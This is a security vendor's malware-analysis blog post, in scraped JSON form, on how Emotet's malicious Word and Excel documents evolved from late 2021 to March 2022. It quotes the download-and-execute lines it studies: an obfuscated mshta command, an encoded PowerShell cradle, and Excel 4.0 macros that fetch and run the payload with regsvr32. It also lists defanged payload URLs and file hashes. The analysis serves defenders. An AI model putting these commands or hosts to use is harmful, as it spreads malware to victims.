{
    "id": "<report_0xc33b56fa>",
    "url": "https://labs.k7computing.com/index.php/diving-into-the-emotet-maldoc-boutade",
    "title": "Diving into the Emotet Maldoc Boutade",
    "meta": [
        {
            "id": "<chapter_0x39226808>",
            "title": "Diving into the Emotet Maldoc Boutade",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0xcfced69c>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "By Gaurav YadavApril 28, 2022",
                    "html": "\nBy Gaurav YadavApril 28, 2022\n \n"
                },
                {
                    "id": "<sentence_0xd7a65f37>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<p></p>"
                },
                {
                    "id": "<sentence_0x5bd92eb>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Emotet is a malware that is spread mainly via e-mail spam campaigns. A typical spam email contains an infected/weaponized document. This document acts as the initial vector that downloads/drops the actual malware and compromises the users machine. In this blog, we will be explaining how Emotet uses Maldocs, password-protected obfuscated macros and the changes done to the same to download the actual payload along with the timeline of the activity starting from November 2021, when it was back after a hiatus, till the time of writing this blog.",
                    "html": "<p>Emotet is a malware that is spread mainly via e-mail spam campaigns. A typical spam email contains an infected/weaponized document. This document acts as the initial vector that downloads/drops the actual malware and compromises the user\u2019s machine. In this blog, we will be explaining how Emotet uses Maldocs, password-protected obfuscated macros and the changes done to the same to download the actual payload along with the timeline of the activity starting from November 2021, when it was back after a hiatus, till the time of writing this blog.</p>"
                }
            ]
        }
    ],
    "chapters": [
        {
            "id": "<chapter_0xa4e59b44>",
            "title": "Diving into the Emotet Maldoc Boutade",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0xb96ec3b9>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x28d878bd>": "https://labs.k7computing.com/wp-content/uploads/2022/04/Emotet-Boutade.png"
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"hidden-social-img\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/04/Emotet-Boutade.png\"/>"
                },
                {
                    "id": "<sentence_0x137be901>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xd97b9826>": "https://labs.k7computing.com/index.php/category/macro/"
                    },
                    "text": "Macro",
                    "html": "<a class=\"uncategorized\" href=\"https://labs.k7computing.com/index.php/category/macro/\">Macro</a>"
                },
                {
                    "id": "<sentence_0xef8cffda>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xe45af3e6>": "https://labs.k7computing.com/index.php/category/malicious-links/"
                    },
                    "text": "Malicious Links",
                    "html": "<a class=\"uncategorized\" href=\"https://labs.k7computing.com/index.php/category/malicious-links/\">Malicious Links</a>"
                },
                {
                    "id": "<sentence_0xdacbe082>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x6a37191b>": "https://labs.k7computing.com/index.php/category/obfuscation-techniques/"
                    },
                    "text": "Obfuscation Techniques",
                    "html": "<a class=\"uncategorized\" href=\"https://labs.k7computing.com/index.php/category/obfuscation-techniques/\">Obfuscation Techniques</a>"
                },
                {
                    "id": "<sentence_0x9f39ec4c>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x56abb54b>": "https://labs.k7computing.com/index.php/category/spam/"
                    },
                    "text": "Spam",
                    "html": "<a class=\"uncategorized\" href=\"https://labs.k7computing.com/index.php/category/spam/\">Spam</a>"
                }
            ]
        },
        {
            "id": "<chapter_0x56e3a4a>",
            "title": "November 2021",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x19a80bf5>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Emotet started sending malicious documents through emails which had password protected VBA macros and the template is as shown in Figure 1.",
                    "html": "<p>Emotet started sending malicious documents through emails which had password protected VBA macros and the template is as shown in Figure 1.</p>"
                },
                {
                    "id": "<sentence_0x98210e1c>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0x9f80d709>": "https://labs.k7computing.com/wp-content/uploads/2022/04/Figure1-1.png"
                    },
                    "text": "Figure 1: Word templates used by maldocs in Nov 2021",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_23856\"><img alt=\"\" class=\"wp-image-23856 size-full\" height=\"466\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/04/Figure1-1.png\" width=\"776\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-23856\">Figure 1: Word templates used by maldocs in Nov 2021</figcaption></figure>"
                },
                {
                    "id": "<sentence_0x30b04b11>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "VBA Macros contained in the .docm file, first invokes cmd.exe to run powershell.exe with the following command",
                    "html": "<p>VBA Macros contained in the \u201c.docm\u201d file, first invokes cmd.exe to run powershell.exe with the following command</p>"
                },
                {
                    "id": "<sentence_0x958154a>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0xfb1f47fe>": "https://labs.k7computing.com/wp-content/uploads/2022/04/snippet1.jpg"
                    },
                    "text": "Snippet 1: PowerShell command to download and execute the Emotet DLL",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_23862\"><img alt=\"\" class=\"wp-image-23862 size-full\" height=\"258\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/04/snippet1.jpg\" width=\"1105\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-23862\">Snippet 1: PowerShell command to download and execute the Emotet DLL</figcaption></figure>"
                },
                {
                    "id": "<sentence_0x7b56e6b2>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "This command will access all the websites stored in the variable $strs and if the Emotet DLL is found, it will download the payload DLL into C:\\ProgramData\\ as <random-name>.dll. After downloading, the DLL will be executed with the help of C:\\Windows\\SysWow64\\rundll32.exe.",
                    "html": "<p>This command will access all the websites stored in the variable $strs and if the Emotet DLL is found, it will download the payload DLL into C:\\ProgramData\\ as \u2018&lt;random-name&gt;.dll\u2019. After downloading, the DLL will be executed with the help of C:\\Windows\\SysWow64\\rundll32.exe.</p>"
                },
                {
                    "id": "<sentence_0xcac7e47e>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0xabf68b46>": "https://labs.k7computing.com/wp-content/uploads/2022/04/Figure2.jpg"
                    },
                    "text": "Figure 2: Execution flow of maldoc",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_23858\"><img alt=\"\" class=\"wp-image-23858 size-full\" height=\"63\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/04/Figure2.jpg\" width=\"978\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-23858\">Figure 2: Execution flow of maldoc</figcaption></figure>"
                },
                {
                    "id": "<sentence_0x868cf041>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Following lure was used in Excel files to trick users into enabling the macros in it. We can notice that Excel is also mispronounced. However, VBA macros were the same for both Excel and Word files.",
                    "html": "<p>Following lure was used in Excel files to trick users into enabling the macros in it. We can notice that Excel is also mispronounced. However, VBA macros were the same for both Excel and Word files.</p>"
                },
                {
                    "id": "<sentence_0xa36cfb5c>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0xd53af1d1>": "https://labs.k7computing.com/wp-content/uploads/2022/04/Figure3-1.png"
                    },
                    "text": "Figure 3: Excel sheet lure",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_23860\"><img alt=\"\" class=\"wp-image-23860 size-full\" height=\"436\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/04/Figure3-1.png\" width=\"1279\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-23860\">Figure 3: Excel sheet lure</figcaption></figure>"
                },
                {
                    "id": "<sentence_0xda086290>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<p> </p>"
                }
            ]
        },
        {
            "id": "<chapter_0x1c71f356>",
            "title": "December 2021",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x8471b233>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Most of the Emotet related maldocs were seen to be dropping a .bat file. Instead of using readable commands, threat actors had obfuscated the commands within the batch script. The .bat file is then executed via CMD .",
                    "html": "<p>Most of the Emotet related maldocs were seen to be dropping a .bat file. Instead of using readable commands, threat actors had obfuscated the commands within the batch script. The .bat file is then executed via CMD .</p>"
                },
                {
                    "id": "<sentence_0x258d1897>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0x53f32c1e>": "https://labs.k7computing.com/wp-content/uploads/2022/04/Figure4.jpg"
                    },
                    "text": "Figure 4: .bat file being dropped in C:\\ProgramData",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_23863\"><img alt=\"\" class=\"wp-image-23863 size-full\" height=\"140\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/04/Figure4.jpg\" width=\"785\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-23863\">Figure 4: .bat file being dropped in C:\\ProgramData</figcaption></figure>"
                },
                {
                    "id": "<sentence_0x1bd1ed09>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0xa69526c2>": "https://labs.k7computing.com/wp-content/uploads/2022/04/Figure5.jpg"
                    },
                    "text": "Figure 5: Obfuscated batch commands in the dropped .bat file",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_23864\"><img alt=\"\" class=\"wp-image-23864 size-full\" height=\"389\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/04/Figure5.jpg\" width=\"1124\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-23864\">Figure 5: Obfuscated batch commands in the dropped .bat file</figcaption></figure>"
                },
                {
                    "id": "<sentence_0x525e220d>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "When the .bat file is executed, it creates a PowerShell process with a base64 encoded PowerShell command. But the final PowerShell command remains similar as seen above in Snippet 1.",
                    "html": "<p>When the .bat file is executed, it creates a PowerShell process with a base64 encoded PowerShell command. But the final PowerShell command remains similar as seen above in Snippet 1.</p>"
                },
                {
                    "id": "<sentence_0xe1293b3a>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "powershell -enc JABzAHQAcgBzAD0AIgBoAHQAdABwADoALwAvAGcAYQBtAGEA",
                    "html": "<p>powershell -enc JABzAHQAcgBzAD0AIgBoAHQAdABwADoALwAvAGcAYQBtAGEA</p>"
                },
                {
                    "id": "<sentence_0xdd2d0295>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "ZQBzAC4AcwBoAG8AcAAvAHcAcAAtAGMAbwBuAHQAZQBuAHQALwBwAGwAdQBnAGkAbgBzAC8AcwBTAFQAVABvAGEARQB3AEMARwA1AFYAQQBTAHcALwAsAGgAdAB0AHAAOgAvAC8AbgBlAHcAcwBhAGEAcgBjAHQAZQBjAGgALgBjAG8AbQAvAHcAcAAtAGMAbwBuA",
                    "html": "<p>ZQBzAC4AcwBoAG8AcAAvAHcAcAAtAGMAbwBuAHQAZQBuAHQALwBwAGwAdQBnAGkAbgBzAC8AcwBTAFQAVABvAGEARQB3AEMARwA1AFYAQQBTAHcALwAsAGgAdAB0AHAAOgAvAC8AbgBlAHcAcwBhAGEAcgBjAHQAZQBjAGgALgBjAG8AbQAvAHcAcAAtAGMAbwBuA\u2026\u2026</p>"
                },
                {
                    "id": "<sentence_0x79593113>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Snippet 2: Base64 encoded PowerShell command",
                    "html": "<p>Snippet 2: Base64 encoded PowerShell command</p>"
                },
                {
                    "id": "<sentence_0x33d0edbe>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0xf798c263>": "https://labs.k7computing.com/wp-content/uploads/2022/04/snippet3.jpg"
                    },
                    "text": "Snippet 3: Decoded PowerShell command",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_23865\"><img alt=\"\" class=\"wp-image-23865 size-full\" height=\"177\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/04/snippet3.jpg\" width=\"945\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-23865\">Snippet 3: Decoded PowerShell command</figcaption></figure>"
                }
            ]
        },
        {
            "id": "<chapter_0x7f2428d9>",
            "title": "December 2021 January 2022",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x3e57ce6d>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "During late December and January 2022, Emotet related maldocs were seen to execute html files present on the malicious site as shown in Snippet 4 with the help of mshta.exe as it can execute the JavaScript present in the html file.",
                    "html": "<p>During late December and January 2022, Emotet related maldocs were seen to execute html files present on the malicious site as shown in Snippet 4 with the help of mshta.exe as it can execute the JavaScript present in the html file.</p>"
                },
                {
                    "id": "<sentence_0x7e82405d>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Following command was executed during execution of word or excel files",
                    "html": "<p>Following command was executed during execution of word or excel files </p>"
                },
                {
                    "id": "<sentence_0xa2b0af08>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "cmd /c m^sh^t^a h^tt^p^:/^/87[.]251[.]86[.]1/pp/pp.html",
                    "html": "<p>cmd /c m^sh^t^a h^tt^p^:/^/87[.]251[.]86[.]1/pp/pp.html</p>"
                },
                {
                    "id": "<sentence_0xb3802854>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Snippet 4: Cmd command executed through macros",
                    "html": "<p>Snippet 4: Cmd command executed through macros</p>"
                },
                {
                    "id": "<sentence_0xf3279aa3>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The JavaScript present contacts the html file, resulting in the execution of the following obfuscated PowerShell command shown in Snippet 5.",
                    "html": "<p>The JavaScript present contacts the html file, resulting in the execution of the following obfuscated PowerShell command shown in Snippet 5. </p>"
                },
                {
                    "id": "<sentence_0x145be414>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0x8b1ff70>": "https://labs.k7computing.com/wp-content/uploads/2022/04/snippet5.jpg"
                    },
                    "text": "Snippet 5: PowerShell command obfuscated by the string Google",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_23867\"><img alt=\"\" class=\"wp-image-23867 size-full\" height=\"303\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/04/snippet5.jpg\" width=\"865\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-23867\">Snippet 5: PowerShell command obfuscated by the string \u201cGoogle\u201d</figcaption></figure>"
                },
                {
                    "id": "<sentence_0xf6c00389>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0x85265062>": "https://labs.k7computing.com/wp-content/uploads/2022/04/snippet6.jpg"
                    },
                    "text": "Snippet 6: Deobfuscated Snippet 5 PowerShell command",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_23868\"><img alt=\"\" class=\"wp-image-23868 size-full\" height=\"57\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/04/snippet6.jpg\" width=\"839\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-23868\">Snippet 6: Deobfuscated Snippet 5 PowerShell command</figcaption></figure>"
                },
                {
                    "id": "<sentence_0x956c72b0>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "If we notice Snippet 6 closely, the PowerShell command tries to contact a URL hxxp:// 87[.]251[.]86[.]178/pp /PP.PNG to get the content from a .png file which is suspicious. The downloaded .png file is not what it is supposed to be, but is a PowerShell script as shown in Figure 6.",
                    "html": "<p>If we notice Snippet 6 closely, the PowerShell command tries to contact a URL \u201dhxxp:// 87[.]251[.]86[.]178/pp /PP.PNG\u201d to get the content from a .png file which is suspicious. The downloaded .png file is not what it is supposed to be, but is a PowerShell script as shown in Figure 6.</p>"
                },
                {
                    "id": "<sentence_0x800c64e4>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0xd5550d3>": "https://labs.k7computing.com/wp-content/uploads/2022/04/Figure6.jpg"
                    },
                    "text": "Figure 6: Content of PP.png",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_23869\"><img alt=\"\" class=\"wp-image-23869 size-full\" height=\"513\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/04/Figure6.jpg\" width=\"1166\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-23869\">Figure 6: Content of PP.png</figcaption></figure>"
                },
                {
                    "id": "<sentence_0x61bde81>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "This command is similar to the original command that Emotet directly stores in VBA macros. However, an extra step of complexity is now employed by the threat actor to evade detection.",
                    "html": "<p>This command is similar to the original command that Emotet directly stores in VBA macros. However, an extra step of complexity is now employed by the threat actor to evade detection.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x1b4c6b50>",
            "title": "February 2022",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x3e2292f1>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "It was noticed that instead of dropping just the .bat file, an obfuscated VBScript was dropped and was executed by wscript.exe as we can see in Figure 7.",
                    "html": "<p>It was noticed that instead of dropping just the .bat file, an obfuscated VBScript was dropped and was executed by wscript.exe as we can see in Figure 7. </p>"
                },
                {
                    "id": "<sentence_0xd5f78a5e>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0x101db75>": "https://labs.k7computing.com/wp-content/uploads/2022/04/Figure7.jpg"
                    },
                    "text": "Figure 7: Procmon logs showing Excel file dropping .vbs and .bat files",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_23870\"><img alt=\"\" class=\"wp-image-23870 size-full\" height=\"245\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/04/Figure7.jpg\" width=\"827\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-23870\">Figure 7: Procmon logs showing Excel file dropping .vbs and .bat files</figcaption></figure>"
                },
                {
                    "id": "<sentence_0xc96fb427>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0x3a77a173>": "https://labs.k7computing.com/wp-content/uploads/2022/04/Figure8.jpg"
                    },
                    "text": "Figure 8: Deobfuscated VBScript",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_23871\"><img alt=\"\" class=\"wp-image-23871 size-full\" height=\"121\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/04/Figure8.jpg\" width=\"628\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-23871\">Figure 8: Deobfuscated VBScript</figcaption></figure>"
                },
                {
                    "id": "<sentence_0x8cf49c90>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "From Figure 8, we can glean that the dropped VBScript is responsible for executing both the .bat file that was dropped and the Emotet DLL file that was downloaded. The .bat file contains an obfuscated PowerShell command which is also base64 encoded. After base64 decoding, we got the following command:",
                    "html": "<p>From Figure 8, we can glean that the dropped VBScript is responsible for executing both the .bat file that was dropped and the Emotet DLL file that was downloaded. The .bat file contains an obfuscated PowerShell command which is also base64 encoded. After base64 decoding, we got the following command:</p>"
                },
                {
                    "id": "<sentence_0x5b4bded9>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0x63b0ca42>": "https://labs.k7computing.com/wp-content/uploads/2022/04/snippet7.jpg"
                    },
                    "text": "Snippet 7: Base64 decoded PowerShell command",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_23872\"><img alt=\"\" class=\"wp-image-23872 size-full\" height=\"318\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/04/snippet7.jpg\" width=\"1137\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-23872\">Snippet 7: Base64 decoded PowerShell command</figcaption></figure>"
                },
                {
                    "id": "<sentence_0xb856ec8b>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The PowerShell command shown in Snippet 7, is used to access all websites stored in the variable gjsebngukiwug3kwjd which downloads the Emotet DLL and places it in C:\\ProgramData so that the earlier dropped VBScript as shown in Figure 8, is able to execute the DLL with the help of rundll32.exe.",
                    "html": "<p>The PowerShell command shown in Snippet 7, is used to access all websites stored in the variable \u201cgjsebngukiwug3kwjd\u201d which downloads the Emotet DLL and places it in C:\\ProgramData so that the earlier dropped VBScript as shown in Figure 8, is able to execute the DLL with the help of rundll32.exe.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0xe4d0f520>",
            "title": "February March 2022",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x8222e684>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "During late February and March, Emotet related maldocs were seen using just Excel Macros 4.0 instead of VBA macros, since excel allows to run functions from cells which enabled the threat actors to obfuscate Emotet macros using different hidden sheets and widespread cells.",
                    "html": "<p>During late February and March, Emotet related maldocs were seen using just Excel Macros 4.0 instead of VBA macros, since excel allows to run functions from cells which enabled the threat actors to obfuscate Emotet macros using different hidden sheets and widespread cells.</p>"
                },
                {
                    "id": "<sentence_0x9c716ab4>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0x65bee953>": "https://labs.k7computing.com/wp-content/uploads/2022/04/Figure9.jpg"
                    },
                    "text": "Figure 9: Hidden macro sheets",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_23873\"><img alt=\"\" class=\"wp-image-23873 size-full\" height=\"476\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/04/Figure9.jpg\" width=\"1188\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-23873\">Figure 9: Hidden macro sheets</figcaption></figure>"
                },
                {
                    "id": "<sentence_0x34a9dca6>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0x690d81a0>": "https://labs.k7computing.com/wp-content/uploads/2022/04/Figure10.jpg"
                    },
                    "text": "Figure 10: Obfuscated macros present in the hidden sheets",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_23874\"><img alt=\"\" class=\"wp-image-23874 size-full\" height=\"691\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/04/Figure10.jpg\" width=\"1172\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-23874\">Figure 10: Obfuscated macros present in the hidden sheets</figcaption></figure>"
                },
                {
                    "id": "<sentence_0x44f29750>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "After deobfuscation the macros looked like what is shown below:",
                    "html": "<p>After deobfuscation the macros looked like what is shown below:</p>"
                },
                {
                    "id": "<sentence_0xbd749907>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "=CALL(urlmon,URLDownloadToFileA,JJCCBB,0, https://dev[.]subs2me[.]com/wp-includes/EMa/,..\\dw1.ocx,0,0)",
                    "html": "<p>=CALL(\u201curlmon\u201d,\u201dURLDownloadToFileA\u201d,\u201dJJCCBB\u201d,0,\u201d https://dev[.]subs2me[.]com/wp-includes/EMa/\u201d,\u201d..\\dw1.ocx\u201d,0,0)</p>"
                },
                {
                    "id": "<sentence_0x912a7735>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "=EXEC(C:\\Windows\\SysWow64\\regsvr32.exe -s ..\\dw1.ocx)",
                    "html": "<p>=EXEC(\u201cC:\\Windows\\SysWow64\\regsvr32.exe -s ..\\dw1.ocx\u201d)</p>"
                },
                {
                    "id": "<sentence_0x7224e019>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "=RETURN()",
                    "html": "<p>=RETURN()</p>"
                },
                {
                    "id": "<sentence_0x4686428c>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Snippet 8: Deobfuscated Excel macros",
                    "html": "<p>Snippet 8: Deobfuscated Excel macros</p>"
                },
                {
                    "id": "<sentence_0x9958f098>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "As we can see from the macro in Snippet 8, the Excel file first calls a function named URLDownloadToFileA which is present in the dll urlmon.dll with the required parameters url: hxxps://dev[.]subs2me[.]com/wp-includes/EMa/ and file name: dw1.ocx.",
                    "html": "<p>As we can see from the macro in Snippet 8, the Excel file first calls a function named URLDownloadToFileA which is present in the dll urlmon.dll with the required parameters url: hxxps://dev[.]subs2me[.]com/wp-includes/EMa/ and file name: dw1.ocx.</p>"
                },
                {
                    "id": "<sentence_0x86b99f4b>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0xedd13da6>": "https://labs.k7computing.com/wp-content/uploads/2022/04/Figure11.jpg"
                    },
                    "text": "Figure 11: Procmon log showing excel file contacting payload sites mentioned in the macros",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_23875\"><img alt=\"\" class=\"wp-image-23875 size-full\" height=\"261\" src=\"https://labs.k7computing.com/wp-content/uploads/2022/04/Figure11.jpg\" width=\"728\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-23875\">Figure 11: Procmon log showing excel file contacting payload sites mentioned in the macros</figcaption></figure>"
                },
                {
                    "id": "<sentence_0xe2357974>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "After getting the .ocx file which is the Emotet dll it is then executed with the help of regsvr32.exe.",
                    "html": "<p>After getting the .ocx file which is the Emotet dll it is then executed with the help of regsvr32.exe.</p>"
                },
                {
                    "id": "<sentence_0x11acee9b>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "If you notice throughout the campaigns, what the threat actors wanted to achieve remained the same viz. to download the Emotet DLL and to execute it. However, the techniques they are using to get this done has been changing consistently so as to evade behaviour based detections. Users should exercise caution whenever they try to open Excel/Word files from unknown sources. Also, use a reputable security product like K7 Total Security which provides protection from such malware. Also keep your security product updated to stay safe from the latest threats.",
                    "html": "<p>If you notice throughout the campaigns, what the threat actors wanted to achieve remained the same viz. to download the Emotet DLL and to execute it. However, the techniques they are using to get this done has been changing consistently so as to evade behaviour based detections. Users should exercise caution whenever they try to open Excel/Word files from unknown sources. Also, use a reputable security product like \u201cK7 Total Security\u201d which provides protection from such malware. Also keep your security product updated to stay safe from the latest threats.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0xff179695>",
            "title": "Indicators of Compromise (IOCs)",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x53fb3c09>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<p> </p>"
                },
                {
                    "id": "<sentence_0x2905a232>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<table_0xb45b6591>": {
                            "0": {
                                "0": "Hash",
                                "1": "8625BAE7CF49EAA789A4E837B124E864",
                                "2": "2B8055CA8B0F93226B13F15CA83ADF41",
                                "3": "6983B7390889217D8F57CF218835DCE4",
                                "4": "B6E9028801480B692E04A6297F4E3CFC",
                                "5": "00BD27A66D752E35A41CB7CE82524C3C"
                            },
                            "1": {
                                "0": "Detection Name",
                                "1": "Trojan ( 0058ce181 )",
                                "2": "Trojan ( 0001140e1 )",
                                "3": "Trojan ( 0058cef41 )",
                                "4": "Trojan ( 0001140e1 )",
                                "5": "Trojan ( 0058ce181 )"
                            }
                        }
                    },
                    "text": "",
                    "html": "<table>\n<tbody>\n<tr>\n<td>Hash</td>\n<td>Detection Name</td>\n</tr>\n<tr>\n<td>8625BAE7CF49EAA789A4E837B124E864 </td>\n<td>Trojan ( 0058ce181 )</td>\n</tr>\n<tr>\n<td>2B8055CA8B0F93226B13F15CA83ADF41</td>\n<td>Trojan ( 0001140e1 )</td>\n</tr>\n<tr>\n<td>6983B7390889217D8F57CF218835DCE4 </td>\n<td> Trojan ( 0058cef41 )</td>\n</tr>\n<tr>\n<td> B6E9028801480B692E04A6297F4E3CFC </td>\n<td>Trojan ( 0001140e1 )</td>\n</tr>\n<tr>\n<td>00BD27A66D752E35A41CB7CE82524C3C </td>\n<td> Trojan ( 0058ce181 )</td>\n</tr>\n</tbody>\n</table>"
                },
                {
                    "id": "<sentence_0x60a07e6e>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<p> </p>"
                }
            ]
        },
        {
            "id": "<chapter_0x39074f09>",
            "title": "URLs",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0xcababf89>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "https://evgeniys[.]ru/sap-logs/D6/",
                    "html": "<p>https://evgeniys[.]ru/sap-logs/D6/</p>"
                },
                {
                    "id": "<sentence_0xdafe9124>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "http://crownadvertising[.]ca/wp-includes/OxiAACCoic/",
                    "html": "<p>http://crownadvertising[.]ca/wp-includes/OxiAACCoic/</p>"
                },
                {
                    "id": "<sentence_0xe8262f2c>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "https://cars-taxonomy[.]mywebartist[.]eu/-/BPCahsAFjwF/",
                    "html": "<p>https://cars-taxonomy[.]mywebartist[.]eu/-/BPCahsAFjwF/</p>"
                },
                {
                    "id": "<sentence_0x695a41fc>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "http://immoinvest[.]com[.]br/blog_old/wp-admin/luoT/",
                    "html": "<p>http://immoinvest[.]com[.]br/blog_old/wp-admin/luoT/</p>"
                },
                {
                    "id": "<sentence_0x7369b5ae>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
